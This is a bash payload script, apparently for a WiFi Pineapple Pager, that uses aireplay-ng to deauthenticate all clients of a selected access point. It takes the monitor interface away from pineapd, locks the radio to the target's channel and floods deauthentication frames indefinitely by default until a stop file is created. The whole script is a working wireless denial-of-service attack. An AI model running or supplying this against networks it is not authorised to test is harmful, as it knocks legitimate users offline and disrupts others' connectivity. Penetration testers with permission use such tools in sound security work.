#!/bin/bash
# Title: Aireplay AP Deauth
# Description: Deauth all clients on the selected AP using wlan1mon
# Author: Jeff
#
# Why the interface handoff?
# pineapd owns wlan1mon while Recon is running and periodically takes it down,
# brings it back up, and changes channels. If aireplay-ng is injecting when
# that happens it dies with:
#     write failed: Network is down
#     wi_write(): Network is down
# and exits non-zero, which looked like "aireplay failed" even though the first
# few deauths had gone out. The channel hopping also means most deauths were
# transmitted on the wrong channel.
#
# So: temporarily tell pineapd to stop using wlan1mon, lock the radio to the
# AP's channel, inject, then hand the interface back to pineapd.
#
# By default this runs indefinitely (COUNT=0). Stop the payload from the Pager
# UI, or over SSH:
#     touch /tmp/aireplay-deauth.stop
# Cleanup returns wlan1mon to pineapd. If the payload is ever hard-killed
# (SIGKILL), restore Recon manually with:
#     _pineap INTERFACE ENABLE wlan1mon

BSSID="${_RECON_SELECTED_AP_BSSID:-}"
CHANNEL="${_RECON_SELECTED_AP_CHANNEL:-}"
SSID="${_RECON_SELECTED_AP_SSID:-}"
IFACE="wlan1mon"
DB="/root/recon/recon.db"
# 0 = keep deauthing until stopped. Pass a positive number for a finite burst.
COUNT="${1:-0}"
case "$COUNT" in
  ''|*[!0-9]*) COUNT=0 ;;
esac

# ALERT/LOG come from the Pager payload runner. Provide fallbacks so the script
# can also be run by hand over SSH.
if ! command -v ALERT >/dev/null 2>&1; then
  ALERT() { echo "$*"; }
fi
if ! command -v LOG >/dev/null 2>&1; then
  LOG() { echo "$*"; }
fi

if [ -z "$BSSID" ]; then
  ALERT "No selected AP BSSID"
  exit 1
fi

# Only accept a plain MAC. This also keeps the SQLite fallback query safe.
case "$BSSID" in
  *[!0-9A-Fa-f:]*)
    ALERT "Invalid BSSID: $BSSID"
    exit 1
    ;;
esac

if ! command -v aireplay-ng >/dev/null 2>&1; then
  ALERT "aireplay-ng not installed"
  exit 1
fi

if ! ip link show "$IFACE" >/dev/null 2>&1; then
  ALERT "Missing $IFACE"
  exit 1
fi

# Recon normally passes the channel in the environment. If it did not, look it
# up in the recon database.
if [ -z "$CHANNEL" ] && [ -f "$DB" ]; then
  KEY=$(printf '%s' "$BSSID" | tr -d ':' | tr 'a-z' 'A-Z')
  CHANNEL=$(sqlite3 "$DB" \
    "SELECT channel FROM ssid WHERE UPPER(REPLACE(bssid,':',''))='$KEY' ORDER BY time DESC LIMIT 1;" \
    2>/dev/null)
fi

case "$CHANNEL" in
  ''|0)
    ALERT "No channel known for $BSSID"
    exit 1
    ;;
  *[!0-9]*)
    ALERT "Invalid channel for $BSSID: $CHANNEL"
    exit 1
    ;;
esac

# Give wlan1mon back to pineapd on every exit path, including Ctrl-C/TERM.
RESTORE=0
STOP_FILE=/tmp/aireplay-deauth.stop
LOG_FILE=/tmp/aireplay-ap.log
AP_PID=""
CLEANED=0

restore_iface() {
  if [ "$RESTORE" -eq 1 ]; then
    _pineap INTERFACE ENABLE "$IFACE" >/dev/null 2>&1
  fi
}

cleanup() {
  [ "$CLEANED" -eq 1 ] && return
  CLEANED=1

  if [ -n "$AP_PID" ] && kill -0 "$AP_PID" 2>/dev/null; then
    kill -TERM "$AP_PID" 2>/dev/null
    for _ in 1 2 3 4 5; do
      kill -0 "$AP_PID" 2>/dev/null || break
      sleep 0.2
    done
    kill -KILL "$AP_PID" 2>/dev/null
  fi
  [ -n "$AP_PID" ] && wait "$AP_PID" 2>/dev/null

  restore_iface
}
trap cleanup EXIT
trap 'cleanup; exit 0' INT TERM HUP

# Stop pineapd's periodic down/up + channel hopping on our inject interface.
if command -v _pineap >/dev/null 2>&1; then
  RESTORE=1
  _pineap INTERFACE DISABLE "$IFACE" >/dev/null 2>&1
fi

ip link set "$IFACE" up 2>/dev/null

# Lock the radio to the AP's channel. Retry once or twice in case the driver is
# still settling after the handoff.
for _ in 1 2 3; do
  iw dev "$IFACE" set channel "$CHANNEL" >/dev/null 2>&1 && break
  sleep 0.2
done

ACTUAL=$(iw dev "$IFACE" info 2>/dev/null | awk '/channel/ {print $2; exit}')
case "$ACTUAL" in
  ''|*[!0-9]*)
    # Some drivers (mt7921u included) do not report the channel through the
    # legacy ioctl, which is why --ignore-negative-one is used below.
    ;;
  *)
    if [ "$ACTUAL" -ne "$CHANNEL" ]; then
      ALERT "Channel lock failed (want $CHANNEL, got $ACTUAL)"
      exit 1
    fi
    ;;
esac

rm -f "$STOP_FILE"

if [ "$COUNT" -eq 0 ]; then
  LOG "Deauthing ${SSID:-$BSSID} on channel $CHANNEL until stopped"
  LOG "Stop from the Pager UI or over SSH: touch $STOP_FILE"
else
  LOG "Deauthing ${SSID:-$BSSID} on channel $CHANNEL ($COUNT frames)"
fi

# -D skips AP detection/beacon wait. The channel is already locked above, and
# this makes the flood start immediately instead of spending seconds looking
# for a beacon the mt7921u driver will not report anyway.
aireplay-ng --deauth "$COUNT" -D -a "$BSSID" --ignore-negative-one "$IFACE" >"$LOG_FILE" 2>&1 &
AP_PID=$!

while kill -0 "$AP_PID" 2>/dev/null; do
  if [ -f "$STOP_FILE" ]; then
    LOG "Stop requested; ending deauth"
    kill -TERM "$AP_PID" 2>/dev/null
    break
  fi
  sleep 1
done

wait "$AP_PID" 2>/dev/null
RC=$?
AP_PID=""

SENT=$(grep -c "Sending DeAuth" "$LOG_FILE" 2>/dev/null)
SENT=${SENT:-0}

# rc 130/143 is a normal stop via INT/TERM, not an aireplay failure.
case "$RC" in
  0|130|143)
    ALERT "Deauth stopped: $SENT frames on ch $CHANNEL"
    ;;
  *)
    ALERT "aireplay failed (rc=$RC, $SENT sent, ch $CHANNEL)"
    ;;
esac
